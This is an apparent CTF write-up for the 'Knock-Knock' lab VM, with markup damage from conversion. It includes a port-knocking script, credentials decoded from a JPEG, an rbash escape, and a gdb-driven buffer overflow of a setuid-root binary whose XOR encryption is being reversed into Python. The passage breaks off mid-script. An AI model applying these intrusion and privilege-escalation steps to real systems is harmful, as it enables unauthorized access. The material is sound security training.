<p>With the ports now open, I did shuffle some ideas with a few people, and it came out the the sequence may be randomized. With that in mind, I decided to slap together a python script that will try all of the possible sequences and knock all of them, hoping that one of them is eventually the correct one:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<p>import socket
import itertools
import sys</p>

<p>destination = &ldquo;192.168.56.203&rdquo;</p>

<p>def clean_up_ports(raw_string):</p>

<pre><code>""" Clean up the raw string received on the socket"""
if len(raw_string) &lt;= 0:
    return None

# Remove the first [
raw_string = raw_string.replace('[','')
# Remove the second ]
raw_string = raw_string.replace(']','')
# split by commas
first_list = raw_string.split(',')

# start e empty return list
ports = []
for port in first_list:
    # strip the whitespace around the string
    # and cast to a integer
    ports.append(int(port.strip()))

return  ports
</code></pre>

<p>def main():</p>

<pre><code>print "[+] Getting sequence"

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((destination, 1337))
except Exception as e:
    print "[+] Unable to connect to %s on port 1337. %s" % (destination, e)
    sys.exit(1)

# receive the list
raw_list = sock.recv(20)

# get the ports in a actual python list
ports = clean_up_ports(raw_list)

print "[+] Sequence is %s" % ports
print "[+] Knocking on the door using all the possible combinations...\n"

# Lets knock all of the possible combinations of the ports list
for port_list in itertools.permutations(ports):

    print "[+] Knocking with sequence: %s" % (port_list,) 
    for port in port_list:
        print "[+] Knocking on port %s:%s" % (destination,port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        sock.connect_ex((destination, port))
        sock.close()

    print "[+] Finished sequence knock\n"
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code>print "[+] Knock knock opener"
main()
print "[+] Done"
</code></pre>

<p>```</p>

<p>Running this opened the ports every go :)</p>

<p>I know that I could test to see if say <code>tcp/22</code> was open, but I went with the assumption that you don&rsquo;t know what the actual ports are that should be opened, and hence the complete run of all of the permutations.</p>

<h2>may I burn the door now?</h2>

<p>So, focus shifted to the web server at <code>tcp/80</code>. Browsing to the web server presented us with the following:</p>

<p><img class="<a" src="href="https://i.imgur.com/5NdJ65y.png">https://i.imgur.com/5NdJ65y.png</a>"></p>

<p>Any path/file that you browse to will return this exact same picture. Sound familiar? :) This kinda breaks any form of scanning and or enumeration via things like <code>wfuzz</code> etc. With the hint <em>Gotta look harder</em>, I decided to move my attention to the door image itself.</p>

<p><code>``bash
root@kali:~# wget http://192.168.56.203/knockknock.jpg
--2014-10-14 13:04:34--  http://192.168.56.203/knockknock.jpg
Connecting to 192.168.56.203:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84741 (83K) [image/jpeg]
Saving to:</code>knockknock.jpg'</p>

<p>100%[============>] 84,741      68.2K/s   in 1.2s</p>

<p>2014-10-14 13:04:35 (68.2 KB/s) &ndash; `knockknock.jpg' saved [84741/84741]
```</p>

<p>I will admit that I was not very keen on the idea that something may be stego&rsquo;d in the image and I was really hoping the hint would be very obvious. I opened up the image in a image viewer and zoomed in a little on the artifact I noticed at the bottom of the image. Nothing I could make real use of there.</p>

<p>Next, I ran the image through exiftool:</p>

<p><code>bash
root@kali:~/Desktop/knock-knock# exiftool knockknock.jpg
ExifTool Version Number         : 8.60
File Name                       : knockknock.jpg
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2014:10:06 18:38:30+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Quality                         : 74%
XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43
Marked                          : © Estate of Roy Lichtenstein
Web Statement                   : © Estate of Roy Lichtenstein
Rights                          : © Estate of Roy Lichtenstein
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 650
Image Height                    : 788
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 650x788
</code></p>

<p>Roy Lichtenstein. The artist of the knock knock image?
Anyways. As you can see, nothing else that is really useful here. So the next part was to have a look at the jpeg in a raw perspective. I am no forensics expert or anything so I am pretty limited in knowledge here.</p>

<p>My idea was to try and recover the jpeg data from <code>knockknock.jpg</code> using <code>recoverjpeg</code>, and then compare the resulting image with the original and check for any differences.</p>

<p>```bash</p>

<h1>extract the jpeg data</h1>

<p>root@kali:~# recoverjpeg knockknock.jpg
Restored 1 picture</p>

<h1>the output image from the extract</h1>

<p>root@kali:~# ls image00000.jpg
image00000.jpg</p>

<h1>the cmp</h1>

<p>root@kali:~# cmp image00000.jpg knockknock.jpg
cmp: EOF on image00000.jpg
```</p>

<p>So, the EOF differs from the 2 files. Lets check them out. First the extracted jpeg data file to see what it sais:</p>

<p><code>``bash
root@kali:~# tail -n 1 image00000.jpg
9��&lt;V ��v�ܫQqRJ5U�&lt;��W�V9</code>��5BV(��&lt;�t�WS�����1h</p>

<pre><code>                                                     ��\���z$���vB��
</code></pre>

<p>```</p>

<p>As expected, junk :P Lets look at <code>knockknock.jpeg</code>:</p>

<p><code>bash
root@kali:~# tail -n 4 knockknock.jpg
⭚|U���b��[�k|U�������+\U����]�U¸��qW|U�]�qWX�F��*��kz����]��ѭqV�k튷�P���b��T�\+\U��Wo��9b�&lt;�V��]���B��[�v*�Uثx�X�x�[����o������|U����v*�^��x��Wb�o���b��b��[����qU����צ*����*���qW�
Login Credentials
abfnW
sax2Cw9Ow
</code></p>

<p>Hah! Login Credentials sound very promising!! :)</p>

<h2>ceasar opens the door</h2>

<p>After finding the hidden strings in the jpeg, I came to a quick realization that <code>abfnW:sax2Cw9Ow</code> was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.</p>

<p>I tried to browse to the paths in the web server such as <code>abfnW/</code> and <code>sax2Cw9Ow/</code>, but still only got the knock knock image. With these arb strings and nothing else really to go on, I had to try get a hint on this.</p>

<p>Turns out, the strings were encoded using a Ceasar Cipher (<a href="http://en.wikipedia.org/wiki/Caesar_cipher">ROT13</a>). With that in mind, I took to a few python 1 liners to decode the strings. Lets start with <strong>abfnW</strong>:</p>

<p><code>bash
root@kali:~# python -c 'print "abfnW".decode("rot13")'
nosaJ
</code></p>

<p>abfnW decoded directly to <strong>nosaJ</strong>. That is <em>Jason</em> reversed. So is the username <code>Jason</code>? Next, I tackled <code>sax2Cw9Ow</code> in a similar fashion:</p>

<p><code>bash
root@kali:~# python -c 'print "sax2Cw9Ow".decode("rot13")'
fnk2Pj9Bj
</code></p>

<p>sax2Cw9Ow decodes to <strong>fnk2Pj9Bj</strong>. Is this one also reversed? After a number of attempts and variations, it turns out that the user name is <strong>jason</strong> (without the cap <em>J</em>) and the password is <strong>fnk2Pj9Bj</strong> (jB9jP2knf reversed.) To get the strings in their correct values, we can use the following 2 one liners to get them:</p>

<p>```bash</p>

<h1>username</h1>

<p>root@kali:~# python -c &lsquo;print &ldquo;abfnW&rdquo;.decode(&ldquo;rot13&rdquo;)[::-1].lower()&rsquo;
jason</p>

<h1>password</h1>

<p>root@kali:~# python -c &lsquo;print &ldquo;sax2Cw9Ow&rdquo;.decode(&ldquo;rot13&rdquo;)[::-1]&rsquo;
jB9jP2knf
```</p>

<p>So to get our first shell:</p>

<p>```bash
root@kali:~/Desktop/knock-knock# ssh <a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x6a;&#x61;&#115;&#x6f;&#x6e;&#64;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x35;&#54;&#x2e;&#x32;&#48;&#51;">&#106;&#97;&#x73;&#x6f;&#x6e;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#53;&#x36;&#46;&#x32;&#x30;&#51;</a>
<a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#106;&#97;&#x73;&#111;&#x6e;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#53;&#x36;&#46;&#50;&#48;&#51;">&#106;&#x61;&#x73;&#111;&#x6e;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x35;&#54;&#x2e;&#x32;&#48;&#51;</a>&rsquo;s password:</p>

<p>Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
jason@knockknock:~$
```</p>

<h2>no rbash, just no</h2>

<p>Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:</p>

<p><code>bash
jason@knockknock:~$ -rbash: /dev/null: restricted: cannot redirect output
-rbash: /dev/null: restricted: cannot redirect output
</code>
Rbash? Oh well thats ok. I checked by inspecting the env var for <code>SHELL</code> which was <code>/bin/rbash</code> just to confirm. Thanks to having recently met a similar situation during the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> boot2root and learning new ways of breaking out of <code>rbash</code>, I just typed <code>nice /bin/bash</code>, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full <code>bash</code> shell.</p>

<h2>tiny file crypter</h2>

<p>Some quick initial enumeration did not reveal anything particularly interesting. In <code>jason</code>&rsquo;s home folder though was a file called <code>tfc</code>:</p>

<p>```bash
jason@knockknock:~$ ls -lah
total 32K
drwxr-xr-x 2 jason jason 4.0K Oct 11 18:51 .
drwxr-xr-x 3 root  root  4.0K Sep 24 21:03 ..
lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history &ndash;> /dev/null
-rw-r&mdash;r&mdash; 1 jason jason  220 Sep 24 21:03 .bash_logout
-rw-r&mdash;r&mdash; 1 jason jason 3.4K Sep 25 21:58 .bashrc
-rw-r&mdash;r&mdash; 1 jason jason  675 Sep 24 21:03 .profile
-rwsr-xr-x 1 root  jason 7.3K Oct 11 18:35 tfc
-rw&mdash;&mdash;&mdash;&ndash; 1 jason jason 2.4K Oct 11 18:42 .viminfo</p>

<p>jason@knockknock:~$ ./tfc</p>

<hr />

<p>_<em>    </em><strong>/_   </strong><strong><em>/_   </em></strong> \
  |    |    |    <strong>)  /    \  \/
  |    |    |     \   \     _</strong><em>
  |</em><em><strong>|    _</strong>  /    _</em>____  /</p>

<pre><code>            \/            \/ 

Tiny File Crypter - 1.0
</code></pre>

<p>Usage: ./tfc &lt;filein.tfc> &lt;fileout.tfc>
jason@knockknock:~$
```</p>

<p><em>Tiny File Crypter</em> appeared to take a input file and encrypt it. Fair enough. The file is owned by root with the <code>setuid</code> bit set, strongly suggesting that if we are able to exploit this binary somehow, we may be able to get root.</p>

<p>Some important observations about <code>tfc</code> during the first bits of testing; Input and output files must have the <code>.tfc</code> extension. <code>tfc</code> does not allow for symlinks as input and or output files. Lastly, the input and output file has to be set and accessible by <code>tfc</code>. Considering its run as root, that probably wont be a problem.</p>

<p>A sample encryption run can be seen as:</p>

<p>```bash</p>

<h1>we have a source document</h1>

<p>jason@knockknock:~$ cat test.tfc
This is a test document.</p>

<h1>we run the encryption program over it</h1>

<p>jason@knockknock:~$ ./tfc test.tfc crypt.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<h1>dump the encrypted file as hex. from the ascii we</h1>

<h1>can see its no longer human readable</h1>

<p>jason@knockknock:~$ xxd crypt.tfc
0000000: cbd9 7399 3cdf 9922 26f1 cb40 5e85 6a6d  ..s.&lt;..&ldquo;&amp;..@^.jm
0000010: 07a4 7543 5048 ea33 6a                   ..uCPH.3j</p>

<h1>the resulting file is owned by root</h1>

<p>jason@knockknock:~$ ls -l crypt.tfc
-rw-r&mdash;r&mdash; 1 root jason 25 Oct 14 08:12 crypt.tfc
```</p>

<p>Now, there is one very important finding. We can reverse the encrypted file by simply running it through <code>tfc</code> again:</p>

<p>```bash
jason@knockknock:~$ ./tfc crypt.tfc reversed.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<p>jason@knockknock:~$ cat reversed.tfc
This is a test document.
```</p>

<p>After finding this, quite a few ideas pop into ones head. Most notably, the fact that the encryption is reversible by using the same tool, suggests it is <a href="http://en.wikipedia.org/wiki/Symmetric-key_algorithm">symmetric</a> using the same key for encryption and decryption.</p>

<p>But ok. That actually means nothing now. It also definitely does not tell us how to break <code>tfc</code> either!</p>

<h2>fuzzing &amp; disassembling tfc</h2>

<p>With all of the information gathered thus far about <code>tfc</code>, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override <code>/etc/shadow</code> to replace <code>root</code>s password, or replace <code>/root/.ssh/authorized_keys</code> with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the <code>.tfc</code> extension.</p>

<p>By now it became very apparent that we have to bring <code>tfc</code> under the microscope and have a closer look at what is happening inside. The first step was to run <code>tfc</code> through <code>strings</code> and check the output:</p>

<p>```bash
jason@knockknock:~$ strings tfc
/lib/ld-linux.so.2</p>

<p>[&hellip; snip &hellip;]</p>

<p>[^_]</p>

<pre><code>Tiny File Crypter - 1.0
</code></pre>

<p>Usage: ./tfc &lt;filein.tfc> &lt;fileout.tfc></p>

<blockquote><blockquote><p>Filenames need a .tfc extension
No symbolic links!
Failed to open input file
Failed to create the output file
File crypted, goodbye!
;*2$"</p>

<hr />

<p>_<em>    </em><strong>/_   </strong><strong><em>/_   </em></strong> \
  |    |    |    <strong>)  /    \  \/
  |    |    |     \   \     _</strong><em>
  |</em><em><strong>|    _</strong>  /    _</em>____  /</p>

<pre><code>            \/            \/ 
</code></pre>

<p>```</p></blockquote></blockquote>

<p>As you can see, quite literally nothing useful. The only familiar thing here was the error messages that I have seen while testing initially :D</p>

<p>I figured I needed to get <code>tfc</code> into <code>gdb</code> and inspect it further there, however this VM did not have <code>gdb</code> installed. So, I copied it off the VM onto my Kali Linux install and plugged it into <code>gdb</code>. Then, to get an idea of what its doing, I started to disassemble it, starting with <code>main</code>:</p>

<p>```bash
root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048924 &lt;+0>: push   ebp
   0x08048925 &lt;+1>: mov    ebp,esp</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x0804894e &lt;+42>:    mov    DWORD PTR [esp],eax
   0x08048951 &lt;+45>:    call   0x80486e6 <cryptFile>    #&lt;&mdash;&ndash;
   0x08048956 &lt;+50>:    test   eax,eax</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x0804896c &lt;+72>:    ret  <br/>
End of assembler dump.
gdb-peda$
```</p>

<p>After some initial setup work and argument checks we notice a call to a function called <code>cryptFile</code>. So the next logical step was to check what happening in that function:</p>

<p>```bash
gdb-peda$ disass cryptFile
Dump of assembler code for function cryptFile:
   0x080486e6 &lt;+0>: push   ebp
   0x080486e7 &lt;+1>: mov    ebp,esp
   0x080486e9 &lt;+3>: sub    esp,0x1088</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x080488a8 &lt;+450>:   mov    DWORD PTR [esp],eax
   0x080488ab &lt;+453>:   call   0x8048618 <xcrypt>       #&lt;&mdash;&ndash;
   0x080488b0 &lt;+458>:   mov    eax,DWORD PTR [ebp-0x14]</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x08048922 &lt;+572>:   leave<br/>
   0x08048923 &lt;+573>:   ret  <br/>
End of assembler dump.
gdb-peda$
```</p>

<p><code>crytFile</code> does some internal <em>things</em> (like <code>call   0x80484a0 &lt;open@plt&gt;</code> opening the file?) and eventually calls a function <code>xcrypt</code>. So, what are we gonna do? Disassemble it ofc! :) Inspecting it it seemed that this may be the actual heart of the encryption logic based on the bunch of <code>xor</code> calls it had. Of course, this is only a guess and I may have missed something else completely.</p>

<p>I also checked out the security features this binary was compiled with:</p>

<p><code>bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></p>

<p>Woa. <strong>No</strong> security? Ok&hellip;</p>

<h2>we knocked and tfc opened the door to bof</h2>

<p>The disassembly of <code>tfc</code> did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)</p>

<p>So, I had the idea to check how it handles large files. And by large I mean to gradually increase the size of the file to be encrypted, starting with like 2MB. So I started to test this:</p>

<p>```bash</p>

<h1>create a file of roughly 2MB</h1>

<p>root@kali:~# dd if=/dev/urandom of=large.tfc bs=1M count=2
2+0 records in
2+0 records out
2097152 bytes (2.1 MB) copied, 0.132812 s, 15.8 MB/s</p>

<h1>confirm the size of the file</h1>

<p>root@kali:~# ls -lh large.tfc
-rw-r&mdash;r&mdash; 1 root root 2.0M Oct 14 15:01 large.tfc</p>

<h1>check how many characters we have in the file</h1>

<p>root@kali:~# wc -c large.tfc
2097152 large.tfc</p>

<h1>attempt encryption</h1>

<p>root@kali:~# ./tfc large.tfc out.tfc
Segmentation fault
```</p>

<p><em>Segmentation fault</em>! Being able to crash <code>tfc</code> is really good news. I went on to test just how many characters were needed to crash <code>tfc</code> in a easily reproducible way, and it came down to something like 6000 characters were doing the job just fine. So, it was time to inspect this crash in <code>gdb</code>. I first prepared a new file with just &ldquo;A&rdquo; in it:</p>

<p><code>bash
root@kali:~# echo -n $(python -c 'print "A"*6000') &gt; gdb-test.tfc
</code></p>

<p>And continued to run it in <code>gdb</code>:</p>

<p>```bash
root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ r gdb-test.tfc gdb-test-out.tfc</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0x0
EBX: 0xb7fbfff4 &mdash;> 0x14bd7c
ECX: 0xffffffc8
EDX: 0x9 (&lsquo;\t&rsquo;)
ESI: 0x0
EDI: 0x0
EBP: 0xc55193b
ESP: 0xbffff3c0 (&ldquo;<em>dv(\002\250C<sup>z</sup>Ɯ=\214<code>P@JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\"\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o"...)
EIP: 0x675c916
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x675c916
[------------------------------------stack-------------------------------------]
0000| 0xbffff3c0 ("_dv(\002\250C^zƜ=\214</code>P@JH\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u</em>˰'\255nL<sup>F</sup>\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\&rdquo;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o"&hellip;)
0004| 0xbffff3c4 &mdash;> 0x5e43a802
0008| 0xbffff3c8 &mdash;> 0x3d9cc67a
0012| 0xbffff3cc &mdash;> 0x4050608c
0016| 0xbffff3d0 (&ldquo;JH\/Ux7;&lt;\243\211T<em>U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL<sup>F</sup>\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\&rdquo;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&ldquo;l\311+\203˃&amp;\322t\217 &rdquo;&hellip;)
0020| 0xbffff3d4 (&ldquo;Ux7;&lt;\243\211T</em>U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL<sup>F</sup>\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\&rdquo;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&ldquo;l\311+\203˃&amp;\322t\217 BG\202\006&rdquo;&hellip;)
0024| 0xbffff3d8 &mdash;> 0x5489a33c
0028| 0xbffff3dc &mdash;> 0x3997552a
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0675c916 in ?? ()
gdb-peda$
```</p>

<p>Ow. Ok, so we don&rsquo;t crash with a clean <em>0x41414141</em> as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.</p>

<h2>planning a exploit</h2>

<p>So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs <strong>after</strong> the encryption function (remember <code>xcrypt</code>?) has run and wants to write the output to file (this is an assumption though).</p>

<p>Ok. So. Make sure you focus now :)</p>

<p>We have already seen earlier that if we try to re-encrypt an already encrypted file, it actually decrypts it. That means, all things considered, if we were to pass a encrypted version of our <em>A</em> buffer, we may be able to have EIP overwritten with our own values. There is one major problem with this though. We are unable to write a encrypted version of our <em>A</em> buffer as we have just observed it crash before the output is written.</p>

<p>So what does this leave us with? If we can reproduce the encryption logic in a way that we can actually write an encrypted version of our <em>A</em> buffer long enough, then we can feed that to <code>tfc</code> and hopefully have workable values. This way we may potentially be able to determine where EIP gets corrupt, and considering <code>tfc</code> had no security as part of the compilation, maybe execute some shell code on the stack.</p>

<p>Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in <code>xcrypt()</code> to get started. Something I have practically 0 experience in.</p>

<h2>reversing xcrypt()</h2>

<p><em>For this part, I have to give a <strong>big</strong> high five to <a href="https://twitter.com/recrudesce">@recrudesce</a> for helping me understand parts of the pseudo code.</em></p>

<p>Right. Essentially, in order for us to better understand what exactly is happening within <code>xcrypt()</code>, we would ideally want to get some pseudo code generated from the asm. Decompiling wont give you exactly the sources for the function (and in many cases its <em>reaaaaaly</em> hard to comprehend), but it <em>really</em> helps in getting the mind to understand the flow.</p>

<p>For the pseudo code, I downloaded a demo version of <a href="http://www.hopperapp.com/">Hopper</a>. The demo has a boat load of restrictions, including a 30min session limit, however it allows the pseudo code generation, so it was fine for this use. I fired up Hopper, loaded <code>tfc</code>, located the <code>xcrypt()</code> function and slapped the Pseudo code generation button:</p>

<p><img class="<a" src="href="https://i.imgur.com/VPUDXvo.png">https://i.imgur.com/VPUDXvo.png</a>"></p>

<p>While looking around for pseudo code generation options, I came across the <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a> online service, which had the following image as a control flow graph for the calls in <code>xcrypt()</code>.</p>

<p><img class="<a" src="href="https://i.imgur.com/cT7i3ob.png">https://i.imgur.com/cT7i3ob.png</a>"></p>

<p>Armed this this graph and the pseudo code, I was ready to start writing a python version of it.</p>

<p>I started by getting a basic skeleton going for the script and working though the pseudo code line by line. Lets work through it and see what it does exactly.</p>

<p><code>c
int xcrypt(int arg0, int arg1) {
</code></p>

<p>We start by declaring the fuction <code>xcrypt()</code>. <code>xcrypt()</code> takes 2 arguments. From inspecting the the parent function <code>cryptFile()</code> that calls <code>xcrypt()</code>, we can see the 2 arguments passed to <code>xcrypt()</code> is the file content and the length of the content respectively. So, <code>arg0</code> is the content and <code>arg1</code> is the content length.</p>

<p>```c</p>

<pre><code>var_C = 0xea1ab19f;
var_10 = arg_0;
var_4 = 0x0;
</code></pre>

<p>```</p>

<p>Here we have 3 variable assignments occur. <code>var_C</code> is set to <code>0xea1ab19f</code>, <code>var_10</code> is set to the file content from <code>arg0</code> and <code>var_4</code> is set to 0.</p>

<p>```c</p>

<pre><code>while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
        *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
</code></pre>

<p>```</p>

<p>This part has one bit that may be very confusing. Comparing this to other output from say IDA and <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a>, we will see that the <code>arg_4</code> referred to here is actually the length of the content, so <code>arg1</code> then.</p>

<p>With that out the way, we see the start of a while loop for <code>arg_4 &gt;&gt; 0x2</code>, which translates to <code>len(content) &gt;&gt; 2</code>, which essentially just means <code>len(content) / 4</code>. While the output of this bitwise right shift is larger than <code>var_4</code>, which is 0 at the start, the loop will continue.</p>

<p>Once inside the loop (and this is the part that for me was the hardest!!!) we see the line <code>*(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</code>. What helped me understand what is going on here was to understand that <code>var_10</code> (which is the content of our file) is being passed by reference. So, <code>var_4 * 4</code> is essentially <code>i*4</code> of the contents, or <code>content[i*4]</code> in python, which is the 4 bytes from <code>var_4</code>. These 4 bytes are being xored by <code>var_C</code>, replacing the original 4 bytes in <code>var_10</code>, to the new xored ones.</p>

<p>So what can we deduce then? The hardcoded base encryption key for <code>tfc</code> is <code>0xea1ab19f</code>. Cool eh! But ok lets move on.</p>

<p>```c</p>

<pre><code>        var_8 = 0x0;
        while (var_8 &lt;= 0x7) {
                if ((var_C &amp; 0x1) != 0x0) {
                        var_C = var_C &gt;&gt; 0x1;
                        var_C = var_C ^ 0x6daa1cf4;
                }
                else {
                        var_C = var_C &gt;&gt; 0x1;
                }
                var_8 = var_8 + 0x1;
        }
        var_4 = var_4 + 0x1;
}
</code></pre>

<p>```</p>

<p>Next we see the start of another loop. Remember we are still in the parent loop that is going for the length of the content. This loop is planning on passing 8 times judging from <code>while (0x0 &lt;= 0x7) {</code>.</p>

<p>Once the loop has started, we see a bitwise <code>and</code> occur that checks if the key (<code>var_C</code>) &amp; 1 does not equal 0. If it does, it does a bitwise right shift and then xors it with <code>0x6daa1cf4</code>. Why <code>0x6daa1cf4</code>? Well, should the key ever become <code>1111 1111 1111 1111</code> (in binary), then any bitshifts will have no effect. If the <code>and</code> does not result in 0, just shift the bits.</p>

<p>This occurs for 8 runs.</p>

<p>So lets sum that up. The key is permutated 8 times via bitshifts for every 4 bytes of content that gets encrypted.</p>

<p>Up to here, I had my python script pretty much nailed as I was able to replicate the encryption as is, and confirmed that decrypting it worked fine. However, if the content length was not exactly divisible by 4, the trailing bits of the content would be mangled.</p>

<p>That brings us to the final part. Rumor has it that this is the padding that occurs. Why this is at the end of the encryption logic (confirmed via multiple pseudo code generators) I don&rsquo;t know :( Maybe someone else can explain this :D I just ignored it :)</p>

<p>```c</p>

<pre><code>var_14 = arg_4 &amp; 0xfffffffc;
var_4 = 0x0;
while ((arg_4 &amp; 0x3) &gt; var_4) {
        *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp; 0xff);
        var_C = var_C &gt;&gt; 0x8;
        var_4 = var_4 + 0x1;
}
return 0x0;
</code></pre>

<p>}
```</p>

<h2>the encryption logic replicated</h2>

<p>While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<p>import struct</p>

<h1>Hopper Pseudo Code</h1>

<h1>int xcrypt(int arg0, int arg1) {</h1>

<h1>var_C = 0xea1ab19f;</h1>

<h1>var_10 = arg_0;</h1>

<h1>var_4 = 0x0;</h1>

<h1>while (arg_4 >> 0x2 > var_4) {</h1>

<h1><em>(var_4 * 0x4 + var_10) = </em>(var_10 + var_4 * 0x4) ^ var_C;</h1>

<h1>var_8 = 0x0;</h1>

<h1>while (var_8 &lt;= 0x7) {</h1>

<h1>if ((var_C &amp; 0x1) != 0x0) {</h1>

<h1>var_C = var_C >> 0x1;</h1>

<h1>var_C = var_C ^ 0x6daa1cf4;</h1>

